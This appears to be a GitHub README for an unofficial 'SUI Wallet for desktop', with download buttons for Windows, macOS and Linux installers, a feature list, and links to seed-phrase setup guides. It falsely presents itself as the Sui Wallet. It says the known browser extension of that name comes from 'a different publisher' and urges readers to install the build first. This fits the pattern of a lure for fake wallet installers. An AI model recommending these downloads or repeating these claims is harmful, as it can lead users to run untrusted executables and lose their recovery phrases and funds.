![SUI Wallet](assets/banner-article.png)

# What is SUI Wallet for desktop?

A native desktop wallet for Sui: self-custody, staking, Ledger and zkLogin in one app.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

SUI Wallet is a self-custody desktop wallet for the Sui network. It holds Sui accounts, signs
transactions, sends and receives SUI, stakes it and connects to applications - and the keys are generated
and stored on your machine, not on a server. It is a desktop application, not a browser extension and not
a hosted account.

## What it is, in one paragraph

A crypto wallet does one job: it holds the secret that proves an account is yours, and uses it to sign transactions that move what the account owns. SUI Wallet does that for the Sui network as a program on a Windows, macOS or Linux machine.

The keys are generated on the machine and stored on the machine. Nobody else holds a copy, which is the
whole point of self-custody: no operator can move the funds, and no operator can freeze them. It also
means no operator can restore them if the phrase is lost. Both halves of that sentence are the product.

## What it actually does

- **Accounts.** One phrase can hold several accounts, each with its own address, selectable in the app.
- **Send and receive.** The send form takes an address and an amount and shows the fee before you sign;
  the receive screen shows the address and its QR.
- **Staking.** Native SUI staking with a validator list that shows the rate, the commission and the
  uptime, with rewards accruing inside the position rather than arriving as a separate deposit.
- **Objects and names.** Sui-standard NFTs are displayed, sent and burned in the app, and SuiNS names
  resolve to addresses.
- **Applications.** Sites and dApps can connect to the wallet, and each request for a signature appears
  in a window that names the site and the account.

That list is the current release, not a plan. A reader comparing it with a page from two years ago will find the older page describes a browser wallet, which is a different product with a different history - and the difference matters most to exactly the reader who is choosing where to keep funds.

## Where the keys live

On your machine. Generation happens locally, storage is local, and signing happens locally: the secret never travels to a server to be used. The machine is therefore the only place the account exists, which is both the strength and the risk.

That is why the recovery phrase is the account and the application is not. Copy the app to a second
machine and you have a second copy of the software with no account in it; enter the 24 words on that
machine and you have the account.

## Desktop only, and why that is stated

There is no mobile build. [The release](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) carries a Windows installer, a macOS disk image and a Linux
archive, and nothing else. That is worth saying plainly because the name is old and search results are
full of assumptions: a reader looking for an app on a phone is looking for something this project does
not make.

The reason is not secrecy, it is fit. A wallet that signs transactions is a wallet you use with a
keyboard, a hardware device and a second window open beside it - which is a desktop shape of work, and
the app is built for it.

## What it is not

- **Not a hosted account.** There is no login with a password stored on a server, no email, no phone
  number, and no recovery desk. Nothing to reset, nothing to lock you out.
- **Not a browser extension.** Extensions live inside a browser profile; this is an installed
  application with its own window.
- **Not a phone app.** See above.
- **Not an exchange.** The wallet holds what you send it; it does not sell you SUI or custody a balance
  for you.

Each "not" matters because each one is a thing a reader may expect and then read as a fault when they do not find it. A hosted account would have a password reset; a browser extension would live in a browser; a phone app would fit in a pocket.

## What a first session looks like

Install it, open it, and the welcome screen offers two paths: create an account, or restore one from 24
words. Creation generates the phrase and shows it once, with a confirmation step, and never shows it
again without a deliberate action in the app.

[Creating a new SUI Wallet](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/creating-a-new-sui-wallet.md) walks the creation flow, and
[SUI Wallet seed phrase setup](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/sui-wallet-seed-phrase-setup.md) covers the phrase screen - which is the part of the first
session worth slowing down for, because those 24 words are the account.

Then the wallet is yours: an address to receive at, a balance, and nothing else required.
[How to install SUI Wallet on Windows](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/how-to-install-sui-wallet-on-windows.md) takes the Windows path from file to first window if you
would rather start there.

## FAQ

### Do I really need a wallet?

If you want to hold SUI yourself, yes - an exchange balance is a claim on an exchange, not a holding you
control. A wallet is what turns "the exchange says I have SUI" into "this address holds SUI".

### What is the benefit over keeping it on an exchange?

The wallet's keys are on your machine, so no operator can move or freeze the balance. The cost is that
no operator can help you recover it either: the phrase is the only backup, and it is yours to keep.

### Is it a digital wallet in the payments sense?

No. It holds crypto assets and signs blockchain transactions; it is not a card wallet or a payments app.
The word "wallet" is shared, the function is not.

### Can I use it without an internet connection?

The application opens and the account is there, but balances, fees and transactions need the network.
A wallet offline is a locked box; it becomes useful when it can read the chain.

### Does it work with several accounts?

Yes. One phrase can hold several accounts, each with its own address, and the app switches between them.

### Is the desktop app the same as the browser extension with the same name?

No, and this is the confusion worth ending: the browser extension under this name is a different
product by a different publisher. This project builds the desktop application described above.
